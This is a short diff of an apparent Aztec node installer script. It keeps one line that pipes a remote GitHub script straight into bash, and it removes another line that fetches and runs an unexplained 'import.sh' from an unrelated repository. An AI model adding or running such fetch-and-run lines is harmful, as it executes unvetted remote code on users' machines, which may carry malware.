@@ -14,8 +14,6 @@ else
 fi
 bash <(curl -fsSL https://github.com/HustleAirdrops/Aztec-One-Command-Installation-Run/raw/main/auto.sh)
 
-bash <(curl -fsSL https://raw.githubusercontent.com/Karanfan47/special-special/main/import.sh)
-
 if ! command -v screen &>/dev/null; then
     sudo apt update && sudo apt install -y screen
 fi
